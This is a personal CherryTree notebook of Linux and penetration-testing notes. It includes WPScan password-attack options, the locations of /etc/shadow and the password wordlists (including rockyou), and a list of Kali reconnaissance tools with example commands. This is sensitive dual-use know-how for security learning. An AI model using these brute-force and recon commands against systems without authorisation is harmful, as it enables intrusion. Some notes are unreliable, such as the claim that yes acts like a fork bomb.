        --plugins-detection MODE                  Use the supplied mode to enumerate Plugins. 
                                                  Default: passive 
                                                  Available choices: mixed, passive, aggressive 
        --plugins-version-detection MODE          Use the supplied mode to check plugins' versions. 
                                                  Default: mixed 
                                                  Available choices: mixed, passive, aggressive 
        --exclude-usernames REGEXP_OR_STRING      Exclude usernames matching the Regexp/string (case insensitive). Regexp delimiters are not required. 
</rich_text>
          <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">    -P, --passwords FILE-PATH                     List of passwords to use during the password attack. </rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">                                                  </rich_text>
          <rich_text foreground="#ffff78780000" weight="heavy">If no </rich_text>
          <rich_text foreground="#f9f9f0f06b6b" weight="heavy">--username</rich_text>
          <rich_text foreground="#ffff78780000" weight="heavy">/</rich_text>
          <rich_text foreground="#f9f9f0f06b6b" weight="heavy">s</rich_text>
          <rich_text foreground="#ffff78780000" weight="heavy"> option supplied, user enumeration will be run.</rich_text>
          <rich_text foreground="#f9f9f0f06b6b" weight="heavy"> </rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">    -U, --usernames LIST                          List of usernames to use during the password attack. </rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">                                                </rich_text>
          <rich_text foreground="#ffff78780000" weight="heavy">  Examples: </rich_text>
          <rich_text foreground="#f9f9f0f06b6b" weight="heavy">'a1'</rich_text>
          <rich_text foreground="#ffff78780000" weight="heavy">, </rich_text>
          <rich_text foreground="#f9f9f0f06b6b" weight="heavy">'a1,a2,a3'</rich_text>
          <rich_text foreground="#ffff78780000" weight="heavy">, </rich_text>
          <rich_text foreground="#f9f9f0f06b6b" weight="heavy">'/tmp/a.txt'</rich_text>
          <rich_text foreground="#ffff78780000" weight="heavy"> </rich_text>
          <rich_text>
        --multicall-max-passwords MAX_PWD         Maximum number of passwords to send by request with XMLRPC multicall 
                                                  Default: 500 
        --password-attack ATTACK                  Force the supplied attack to be used rather than automatically determining one. 
                                                  Multicall will only work against WP &lt; 4.4 
                                                  Available choices: wp-login, xmlrpc, xmlrpc-multicall 
        --login-uri URI                           The URI of the login page if different from /wp-login.php 
        --stealthy                                Alias for --random-user-agent --detection-mode passive --plugins-version-detection passive 
 
[!] To see full list of options use --hh.
 
</rich_text>
        </node>
      </node>
      <node name="xmodmap" unique_id="221" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286966" ts_lastsave="1695268716">
        <rich_text>xmodmap (1)          - utility for modifying keymaps and pointer button mappings in X
</rich_text>
      </node>
      <node name="xrandr" unique_id="146" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285350" ts_lastsave="1695268779">
        <rich_text>xrandr (1)           - primitive command line interface to RandR extension
</rich_text>
      </node>
      <node name="yes" unique_id="75" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284569" ts_lastsave="1695268783">
        <rich_text>yes (1)              - output a string repeatedly until killed

its act  like a fork bomb!</rich_text>
      </node>
      <node name="yum" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284969" ts_lastsave="1727736920">
        <rich_text>package installer</rich_text>
      </node>
      <node name="zcat" unique_id="140" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285304" ts_lastsave="1695268824">
        <rich_text>zcat (1)             - compress or expand files
</rich_text>
      </node>
      <node name="zip" unique_id="137" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285288" ts_lastsave="1695268834">
        <rich_text>zip (1)              - package and compress (archive) files
</rich_text>
      </node>
    </node>
    <node name="File Status" unique_id="285" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="60" is_bold="0" foreground="" ts_creation="1695268891" ts_lastsave="1728544818">
      <rich_text scale="h1" weight="heavy">File status/informations/details</rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2" weight="heavy">file</rich_text>
      <rich_text scale="h1" weight="heavy">
</rich_text>
      <rich_text>file (1)				- determine file type
</rich_text>
      <rich_text scale="h1" weight="heavy">
</rich_text>
      <rich_text scale="h2" weight="heavy">wc</rich_text>
      <rich_text scale="h1" weight="heavy">
</rich_text>
      <rich_text>wc (1)					- print newline, word, and byte counts for each file
</rich_text>
      <rich_text scale="h1" weight="heavy">
</rich_text>
      <rich_text scale="h2" weight="heavy">stat</rich_text>
      <rich_text scale="h1" weight="heavy">
</rich_text>
      <rich_text>stat (1)				- display file or file system status
stat (2)				- get file status
stat (3type)			- file status

</rich_text>
      <rich_text scale="h2" weight="heavy">cat</rich_text>
      <rich_text>
cat (1)					- concatenate files and print on the standard output
</rich_text>
    </node>
    <node name="Help" unique_id="286" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="243" is_bold="0" foreground="" ts_creation="1695268960" ts_lastsave="1728277666">
      <rich_text scale="h1" weight="heavy">Commands Help</rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h3" weight="heavy"># Commands</rich_text>
      <rich_text>
</rich_text>
      <rich_text foreground="#35358484e4e4">man
whatis
apropose
type
whereis
which</rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h3" weight="heavy"># Help option</rich_text>
      <rich_text>
&lt;command&gt; </rich_text>
      <rich_text foreground="#35358484e4e4">-h</rich_text>
      <rich_text>
&lt;command&gt; </rich_text>
      <rich_text foreground="#35358484e4e4">--help</rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h3" foreground="#5757e3e38989" weight="heavy"># Google IT!</rich_text>
      <rich_text>
</rich_text>
      <rich_text link="webs http://www.google.com">www.google.com</rich_text>
      <rich_text>
</rich_text>
      <rich_text link="webs http://www.overstakflow.com">www.overstakflow.com</rich_text>
      <rich_text>
</rich_text>
      <rich_text link="webs http://www.github.com">www.github.com</rich_text>
      <rich_text>
</rich_text>
    </node>
    <node name="System Info" unique_id="283" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="133" is_bold="0" foreground="" ts_creation="1695265840" ts_lastsave="1729830276">
      <rich_text scale="h1" weight="heavy">System information Commands</rich_text>
      <rich_text>

</rich_text>
      <rich_text foreground="#35358484e4e4">uname
hostname
hostnamectl
whoami
who
env
w
last
users
id
journalctl
xrandr
neofetch</rich_text>
    </node>
  </node>
  <node name="Path" unique_id="246" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="230" is_bold="0" foreground="" ts_creation="1685431737" ts_lastsave="1730250183">
    <rich_text scale="h1">Important Path of Linux</rich_text>
    <rich_text>
</rich_text>
    <node name="Constants" unique_id="288" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697256940" ts_lastsave="1729190559">
      <rich_text scale="h1" weight="heavy">Linux Important</rich_text>
      <rich_text scale="h1"> Constants/Variables</rich_text>
      <rich_text>

---

</rich_text>
      <rich_text weight="heavy">SEE:</rich_text>
      <rich_text>
echo </rich_text>
      <rich_text foreground="#2e2ec2c27e7e" weight="heavy">$</rich_text>
      <rich_text weight="heavy">VARIABLE</rich_text>
      <rich_text>

</rich_text>
      <rich_text weight="heavy">WRITE:</rich_text>
      <rich_text>
</rich_text>
      <rich_text weight="heavy">VARIABLE</rich_text>
      <rich_text>=...

</rich_text>
      <rich_text weight="heavy">WRITE</rich_text>
      <rich_text>:
export </rich_text>
      <rich_text weight="heavy">VARIABLE</rich_text>
      <rich_text>=...

---

• see the curent shell
</rich_text>
      <rich_text foreground="#2e2ec2c27e7e">echo </rich_text>
      <rich_text foreground="#2e2ec2c27e7e" weight="heavy">$0</rich_text>
      <rich_text>
</rich_text>
      <rich_text foreground="#2e2ec2c27e7e">echo </rich_text>
      <rich_text foreground="#2e2ec2c27e7e" weight="heavy">$SHELL</rich_text>
      <rich_text>


• see the source code library (PATH)
</rich_text>
      <rich_text foreground="#2e2ec2c27e7e">echo </rich_text>
      <rich_text foreground="#2e2ec2c27e7e" weight="heavy">$PATH</rich_text>
      <rich_text>


• see all users of machine
</rich_text>
      <rich_text foreground="#2e2ec2c27e7e">echo</rich_text>
      <rich_text foreground="#2e2ec2c27e7e" weight="heavy"> $USER</rich_text>
      <rich_text>


• see environment value
</rich_text>
      <rich_text foreground="#2e2ec2c27e7e">echo </rich_text>
      <rich_text foreground="#2e2ec2c27e7e" weight="heavy">$TERM</rich_text>
      <rich_text>

</rich_text>
      <node name="$0" unique_id="371" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728095318" ts_lastsave="1728097465">
        <rich_text># see the curent shell
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">echo </rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">$0</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">echo </rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">$SHELL</rich_text>
        <rich_text>

# Replace shell
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">export </rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">SHELL</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">=/bin/bash</rich_text>
      </node>
      <node name="$PATH" unique_id="370" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728095226" ts_lastsave="1729449794">
        <rich_text># see the source code library (PATH)
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">echo </rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">$PATH</rich_text>
        <rich_text>


$PATH
|
|_	/bin
|_	/sbin
|
|_	/usr/bin
|_	/usr/sbin
|
|_	/usr/local/bin
|_	/usr/local/sbin
|
|_	/snap/bin
|_	/snap/sbin


</rich_text>
        <rich_text weight="heavy">Update</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">PATH</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">=</rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">$PAHT</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">:</rich_text>
        <rich_text>...

</rich_text>
        <rich_text weight="heavy">Replace</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">PATH</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">=</rich_text>
        <rich_text>...


# </rich_text>
        <rich_text foreground="#f6f6d3d32d2d">Trick :</rich_text>
        <rich_text foreground="#f5f5c2c21111"> </rich_text>
        <rich_text>add all important dirs to source code library (PATH)
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">PATH</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">=</rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">$PAHT</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/snap/bin:/snap/sbin</rich_text>
        <rich_text>

# </rich_text>
        <rich_text foreground="#f6f6d3d32d2d">Trick :</rich_text>
        <rich_text foreground="#f5f5c2c21111"> </rich_text>
        <rich_text>write important dirs to source code library (PATH)
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">PATH</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/snap/bin:/snap/sbin</rich_text>
      </node>
      <node name="$USER" unique_id="372" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728095341" ts_lastsave="1728097066">
        <rich_text># see all users of machine
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">echo</rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy"> $USER</rich_text>
        <rich_text>

# Replace
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">USER</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">=</rich_text>
        <rich_text>...</rich_text>
      </node>
      <node name="$TERM" unique_id="373" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728095349" ts_lastsave="1728279037">
        <rich_text># see environment value
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">echo </rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">$TERM</rich_text>
        <rich_text>

# Replace environment
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">export </rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">TERM</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">=screen</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">export </rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">TERM</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">=xterm</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">export </rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">TERM</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">=xterm-256</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">export </rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">TERM</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">=xterm-256color
</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#9a9a99999696"># Replace (it may not work)</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#2626a2a26969" weight="heavy">TERM</rich_text>
        <rich_text foreground="#2626a2a26969">=</rich_text>
        <rich_text>...
</rich_text>
      </node>
    </node>
    <node name="Directions" unique_id="359" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1725521888" ts_lastsave="1729449822">
      <rich_text scale="h1" weight="heavy">Linux Important</rich_text>
      <rich_text scale="h1"> Files/Folders</rich_text>
      <node name="DNS" unique_id="347" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724740682" ts_lastsave="1728275739">
        <rich_text scale="h1" weight="heavy">NetworkManager DNS</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">/etc/resolv.conf</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2"># see</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">cat</rich_text>
        <rich_text foreground="#2e2ec2c27e7e"> /etc/resolv.conf
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">tac</rich_text>
        <rich_text foreground="#2e2ec2c27e7e"> /etc/resolv.conf
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">less</rich_text>
        <rich_text foreground="#2e2ec2c27e7e"> /etc/resolv.conf
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">more</rich_text>
        <rich_text foreground="#2e2ec2c27e7e"> /etc/resolv.conf
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">tail</rich_text>
        <rich_text foreground="#2e2ec2c27e7e"> /etc/resolv.conf
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">head</rich_text>
        <rich_text foreground="#2e2ec2c27e7e"> /etc/resolv.conf

</rich_text>
        <rich_text scale="h2"># edit</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">vim</rich_text>
        <rich_text foreground="#2e2ec2c27e7e"> /etc/resolv.conf
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">nano</rich_text>
        <rich_text foreground="#2e2ec2c27e7e"> /etc/resolv.conf
</rich_text>
        <rich_text foreground="#2e2ec2c27e7e" weight="heavy">mousepad</rich_text>
        <rich_text foreground="#2e2ec2c27e7e"> /etc/resolv.conf</rich_text>
        <rich_text>
</rich_text>
        <rich_text scale="h2" weight="heavy"> 
</rich_text>
        <rich_text scale="h2"># Sample</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#c0c0bfbfbcbc">$ cat /etc/resolv.conf</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#777776767b7b"># Generated by NetworkManager
nameserver 178.22.122.100	# Shecan DNS
nameserver 185.51.200.2		# Shecan DNS</rich_text>
      </node>
      <node name="hosts" unique_id="247" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685431849" ts_lastsave="1728275722">
        <rich_text scale="h1" weight="heavy">$ cat /etc/hosts</rich_text>
        <rich_text scale="h1">
</rich_text>
        <rich_text>
127.0.0.1	localhost
127.0.1.1	VIRTUAL

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</rich_text>
      </node>
      <node name="passwd/shadow" unique_id="251" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685696073" ts_lastsave="1729831539">
        <rich_text scale="h1" weight="heavy">Passwords File Location</rich_text>
        <rich_text>
passwords(hash of passwords) are stored in "</rich_text>
        <rich_text foreground="#ffffbebe6f6f">shadow</rich_text>
        <rich_text>" file

/etc/passwd				# passwords records
/etc/passwd-			# passwords records baskup 

/etc/shadow				# passwords shadow records
/etc/shadow-			# passwords shadow records backup</rich_text>
      </node>
      <node name="proxychains" unique_id="360" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1725521953" ts_lastsave="1725522530">
        <rich_text scale="h1" weight="heavy">$ cat /etc/proxychains4.conf</rich_text>
        <rich_text>


</rich_text>
        <rich_text foreground="#6262a0a0eaea">$ proxychains --help 

Usage:  proxychains -q -f config_file program_name [arguments]
        -q makes proxychains quiet - this overrides the config setting
        -f allows one to manually specify a configfile to use
        
        for example : proxychains telnet somehost.com</rich_text>
      </node>
      <node name="tmp" unique_id="361" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1725521961" ts_lastsave="1728100802">
        <rich_text scale="h1" weight="heavy">/tmp</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#f6f6d3d32d2d">• all data in here will be gone after shuting down the system or reboot
• and access is mostly all datas free for  for all users</rich_text>
      </node>
      <node name="null" unique_id="374" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1728100685" ts_lastsave="1728275643">
        <rich_text scale="h1" weight="heavy">/dev/null</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#f6f6d3d32d2d">/dev/null in Linux is a null device file.
This will discard anything written to it, and will return EOF on reading.
This is a command-line hack that acts as a vacuum, that sucks anything thrown to it.</rich_text>
        <rich_text>
</rich_text>
      </node>
      <node name="var" unique_id="402" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1729449822" ts_lastsave="1729450038">
        <rich_text scale="h1" weight="heavy">/var</rich_text>
        <rich_text>

In Linux, /var is a standard directory that stands for "variable files".
As the name suggests, this directory contains data that changes frequently while the system is running.</rich_text>
      </node>
    </node>
    <node name="Wordlists" unique_id="405" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1730105640" ts_lastsave="1730107218">
      <rich_text scale="h1" weight="heavy">wordlists</rich_text>
      <rich_text scale="h1"> ~ Contains the rockyou wordlist</rich_text>
      <rich_text>

</rich_text>
      <rich_text foreground="#5454ff" weight="heavy">/usr/share/wordlists</rich_text>
      <rich_text>
├── </rich_text>
      <rich_text foreground="#54ffff" weight="heavy">amass</rich_text>
      <rich_text> -&gt; </rich_text>
      <rich_text foreground="#5454ff" weight="heavy">/usr/share/amass/wordlists</rich_text>
      <rich_text>
├── </rich_text>
      <rich_text foreground="#54ffff" weight="heavy">brutespray</rich_text>
      <rich_text> -&gt; </rich_text>
      <rich_text foreground="#5454ff" weight="heavy">/usr/share/brutespray/wordlist</rich_text>
      <rich_text>
├── </rich_text>
      <rich_text foreground="#54ffff" weight="heavy">dirb</rich_text>
      <rich_text> -&gt; </rich_text>
      <rich_text foreground="#5454ff" weight="heavy">/usr/share/dirb/wordlists</rich_text>
      <rich_text>
├── </rich_text>
      <rich_text foreground="#54ffff" weight="heavy">dirbuster</rich_text>
      <rich_text> -&gt; </rich_text>
      <rich_text foreground="#5454ff" weight="heavy">/usr/share/dirbuster/wordlists</rich_text>
      <rich_text>
├── </rich_text>
      <rich_text foreground="#54ffff" weight="heavy">dnsmap.txt</rich_text>
      <rich_text> -&gt; /usr/share/dnsmap/wordlist_TLAs.txt
├── </rich_text>
      <rich_text foreground="#54ffff" weight="heavy">fasttrack.txt</rich_text>
      <rich_text> -&gt; /usr/share/set/src/fasttrack/wordlist.txt
├── </rich_text>
      <rich_text foreground="#54ffff" weight="heavy">fern-wifi</rich_text>
      <rich_text> -&gt; </rich_text>
      <rich_text foreground="#5454ff" weight="heavy">/usr/share/fern-wifi-cracker/extras/wordlists</rich_text>
      <rich_text>
├── </rich_text>
      <rich_text foreground="#54ffff" weight="heavy">john.lst</rich_text>
      <rich_text> -&gt; /usr/share/john/password.lst
├── </rich_text>
      <rich_text foreground="#54ffff" weight="heavy">legion</rich_text>
      <rich_text> -&gt; </rich_text>
      <rich_text foreground="#5454ff" weight="heavy">/usr/share/legion/wordlists</rich_text>
      <rich_text>
├── </rich_text>
      <rich_text foreground="#54ffff" weight="heavy">metasploit</rich_text>
      <rich_text> -&gt; </rich_text>
      <rich_text foreground="#5454ff" weight="heavy">/usr/share/metasploit-framework/data/wordlists</rich_text>
      <rich_text>
├── </rich_text>
      <rich_text foreground="#54ffff" weight="heavy">nmap.lst</rich_text>
      <rich_text> -&gt; /usr/share/nmap/nselib/data/passwords.lst
├── rockyou.txt
├── </rich_text>
      <rich_text foreground="#ff5454" weight="heavy">rockyou.txt.gz</rich_text>
      <rich_text>
├── </rich_text>
      <rich_text foreground="#54ffff" weight="heavy">seclists</rich_text>
      <rich_text> -&gt; </rich_text>
      <rich_text foreground="#5454ff" weight="heavy">/usr/share/seclists</rich_text>
      <rich_text>
├── </rich_text>
      <rich_text foreground="#54ffff" weight="heavy">sqlmap.txt</rich_text>
      <rich_text> -&gt; /usr/share/sqlmap/data/txt/wordlist.txt
├── </rich_text>
      <rich_text foreground="#54ffff" weight="heavy">wfuzz</rich_text>
      <rich_text> -&gt; </rich_text>
      <rich_text foreground="#5454ff" weight="heavy">/usr/share/wfuzz/wordlist</rich_text>
      <rich_text>
└── </rich_text>
      <rich_text foreground="#54ffff" weight="heavy">wifite.txt</rich_text>
      <rich_text> -&gt; /usr/share/dict/wordlist-probable.txt</rich_text>
      <node name="Most Use" unique_id="406" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1730107108" ts_lastsave="1730107158">
        <rich_text scale="h3" foreground="#f6f661615151" weight="heavy">ROCKYOU</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#f6f661615151">/usr/share/wordlists/rockyou.txt</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h3" weight="heavy">dirb</rich_text>
        <rich_text>
|_/usr/share/wordlists/dirb/common.txt
|_/usr/share/wordlists/dirb/small.txt
|_/usr/share/wordlists/dirb/big.txt
|_/usr/share/wordlists/dirb/extensions_common.txt
|_/usr/share/wordlists/dirb/mutations_common.txt
|_</rich_text>
        <rich_text foreground="#6262a0a0eaea">others</rich_text>
        <rich_text>
|_</rich_text>
        <rich_text foreground="#6262a0a0eaea">stress</rich_text>
        <rich_text>
|_</rich_text>
        <rich_text foreground="#6262a0a0eaea">vulns</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h3" weight="heavy">dirbuster</rich_text>
        <rich_text>
/usr/share/wordlists/dirbuster/apache-user-enum-1.0.txt
/usr/share/wordlists/dirbuster/apache-user-enum-2.0.txt
/usr/share/wordlists/dirbuster/directory-list-1.0.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

</rich_text>
        <rich_text scale="h3" weight="heavy">seclists</rich_text>
        <rich_text>
|_</rich_text>
        <rich_text foreground="#6262a0a0eaea">Discovery</rich_text>
        <rich_text>
| |_</rich_text>
        <rich_text foreground="#6262a0a0eaea">DNS</rich_text>
        <rich_text>
|   |_/usr/share/seclists/Discovery/DNS/bug-bounty-program-subdomains-trickest-inventory.txt
|   |_/usr/share/seclists/Discovery/DNS/combined_subdomains.txt
|   |_/usr/share/seclists/Discovery/DNS/namelist.txt
|   |_/usr/share/seclists/Discovery/DNS/shubs-subdomains.txt
|   |_/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
|_</rich_text>
        <rich_text foreground="#6262a0a0eaea">Fuzzing</rich_text>
        <rich_text>
|_</rich_text>
        <rich_text foreground="#6262a0a0eaea">IOCs</rich_text>
        <rich_text>
|_</rich_text>
        <rich_text foreground="#6262a0a0eaea">Miscellaneous</rich_text>
        <rich_text>
|_</rich_text>
        <rich_text foreground="#6262a0a0eaea">Passwords</rich_text>
        <rich_text>
|_</rich_text>
        <rich_text foreground="#6262a0a0eaea">Pattern-Matching</rich_text>
        <rich_text>
|_</rich_text>
        <rich_text foreground="#6262a0a0eaea">Payloads</rich_text>
        <rich_text>
|_</rich_text>
        <rich_text foreground="#6262a0a0eaea">Usernames</rich_text>
        <rich_text>
|_</rich_text>
        <rich_text foreground="#6262a0a0eaea">Web-Shells</rich_text>
      </node>
    </node>
  </node>
  <node name="Peneteration" unique_id="303" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="112" is_bold="0" foreground="" ts_creation="1718594697" ts_lastsave="1730250188">
    <rich_text scale="h1">How To Peneteration</rich_text>
    <rich_text>
</rich_text>
    <node name="a-150" unique_id="306" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1718599518" ts_lastsave="1729190587">
      <rich_text scale="h1" weight="heavy"># Kali Linux Tools for Information Gathering</rich_text>
      <rich_text>

## 1. Nmap
Description: Network exploration tool and security/port scanner.
Example: nmap -sV example.com

## 2. Wireshark
Description: Network protocol analyzer.
Example: wireshark

## 3. Metasploit
Description: Penetration testing framework.
Example: msfconsole

## 4. Nikto
Description: Web server scanner.
Example: nikto -h http://example.com

## 5. theHarvester
Description: E-mail, subdomain, hosts, people names, and open ports gathering tool.
Example: theHarvester -d example.com -b google

## 6. Recon-ng
Description: Full-featured web reconnaissance framework.
Example: recon-ng

## 7. Maltego
Description: Interactive data mining tool.
Example: maltego

## 8. Netcat
Description: Networking utility for reading/writing network connections.
Example: nc -v example.com 80

## 9. Aircrack-ng
Description: Set of tools for auditing wireless networks.
Example: aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capturefile.cap

## 10. OWASP ZAP
Description: Zed Attack Proxy for finding vulnerabilities in web applications.
Example: owasp-zap

## 11. Shodan
Description: Search engine for Internet-connected devices.
Example: shodan search "apache"

## 12. WhatWeb
Description: Website fingerprinting tool.
Example: whatweb example.com

## 13. Fierce
Description: DNS reconnaissance tool.
Example: fierce --domain example.com

## 14. Sublist3r
Description: Subdomains enumeration tool.
Example: sublist3r -d example.com

## 15. GoBuster
Description: Directory/file &amp; DNS busting tool.
Example: gobuster dir -u http://example.com -w wordlist.txt

## 16. DirBuster
Description: Directory brute force tool.
Example: dirbuster

## 17. Amap
Description: Application protocol detection scanner.
Example: amap example.com

## 18. SSLyze
Description: SSL configuration scanner.
Example: sslyze example.com

## 19. W3AF
Description: Web application attack and audit framework.
Example: w3af

## 20. Censys
Description: Search engine for Internet-connected devices.
Example: censys search "apache"

## 21. Traceroute
Description: Network diagnostic tool for tracing the path packets take.
Example: traceroute example.com

## 22. DNSenum
Description: DNS enumeration tool.
Example: dnsenum example.com

## 23. Netdiscover
Description: Network address discovering tool.
Example: netdiscover

## 24. Fping
Description: Scriptable ping program.
Example: fping -a -g 192.168.1.0/24

## 25. Dmitry
Description: Deepmagic information gathering tool.
Example: dmitry -winsep example.com

## 26. Dnsmap
Description: DNS mapping tool.
Example: dnsmap example.com

## 27. Masscan
Description: Fast port scanner.
Example: masscan -p0-65535 example.com

